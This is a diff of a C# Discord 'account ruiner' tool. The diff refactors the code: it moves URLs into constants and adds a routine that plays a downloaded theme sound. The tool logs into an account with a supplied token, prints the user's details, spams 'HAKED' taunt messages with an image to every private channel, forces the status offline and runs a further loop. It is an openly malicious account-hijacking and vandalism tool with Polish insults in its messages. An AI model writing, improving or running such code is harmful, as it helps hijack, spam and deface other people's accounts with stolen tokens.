@@ -19,12 +19,31 @@ namespace h1lfiger
     class Program
     {
         const string hilfiger = "hilf1ger @dup4slon1a:~$ ./j4npw3l - ";
-        const string sound = "guwno.wav";
-        static DiscordSocketClient client = new DiscordSocketClient();
-        static WebClient http = new WebClient();
+        const string theme_location = "guwno.wav";
+        static readonly string image_url = "https://media.discordapp.net/attachments/729323613877960724/735555010691072101/unknown.png";
+        static readonly string embed_image_url = "https://media.discordapp.net/attachments/729323613877960724/735555010691072101/unknown.png";
+        static readonly string theme_sound = "https://cdn.discordapp.com/attachments/729323613877960724/741026268673474580/wav.wav";
 
+        static DiscordSocketClient client = new DiscordSocketClient();
+        static EmbedMaker embed = new EmbedMaker();
+
+        static WebClient http = new WebClient();
         static System.Media.SoundPlayer player = new System.Media.SoundPlayer();
 
+        #region theme
+        static void playTheme(string sound)
+        {
+            if(!File.Exists(theme_location))
+                http.DownloadFile(sound, theme_location);
+
+            player.SoundLocation = theme_location;
+
+            player.Load();
+            player.PlaySync();
+        }
+
+        #endregion
+        #region login
         static void Login(string token)
         {
             try
@@ -44,8 +63,7 @@ namespace h1lfiger
                     hilfiger + "Hypesquad: " + client.GetUser(id).Hypesquad +
                     "\n" +
                     hilfiger + "ID: " + client.GetUser(id).Id +
-                    "\n" +
-                    hilfiger + "WE ARE ANONYNIUS WE ARE THE LEGION"); Thread.Sleep(500);
+                    "\n"); Thread.Sleep(500);
 
             }
             catch
@@ -53,7 +71,8 @@ namespace h1lfiger
                 Console.WriteLine(hilfiger + "Please check if your token is valid");
             }
         }
-
+        #endregion
+        #region main_code
         static void AccountRuiner()
         {
             Console.Clear();
@@ -71,10 +90,9 @@ namespace h1lfiger
 
             foreach (var dm in client.GetPrivateChannels())
             {
-                EmbedMaker embed = new EmbedMaker();
                 embed.Title = hilfiger + "HAKED KURWA ROBALE DZIWKO TO HILFIGER A NIE TOMASZ HAJTO AXAXA";
                 embed.Description = ":sunglasses:";
-                embed.ImageUrl = "https://media.discordapp.net/attachments/729323613877960724/735555010691072101/unknown.png";
+                embed.ImageUrl = embed_image_url;
 
                 dm.SendMessage(hilfiger + "pw3d by hilf1ger 5quad saxax: " + client.GetUser(id).Username + " axaxaxax", false, embed); Thread.Sleep(100);
 
@@ -93,7 +111,7 @@ namespace h1lfiger
 
             Console.WriteLine(hilfiger + "Account user status set to: offline \n");
 
-            http.DownloadFile("https://media.discordapp.net/attachments/729323613877960724/735555010691072101/unknown.png", "image.png");
+            http.DownloadFile(image_url, "image.png");
 
 
             for (int i = 1; i <= 100; i++) 
@@ -105,15 +123,12 @@ namespace h1lfiger
 
             Console.WriteLine(hilfiger + "HOLZED \n");
         }
+        #endregion
 
         static void Main(string[] args)
         {
+            playTheme(theme_sound);
             Console.Title = "$ h1lfiger5qu4d";
-
-            http.DownloadFile("https://cdn.discordapp.com/attachments/729323613877960724/741026268673474580/wav.wav", sound);
-            player.SoundLocation = sound;
-            player.Load();
-            player.PlaySync();
 
         main_menu:
             Console.Clear();
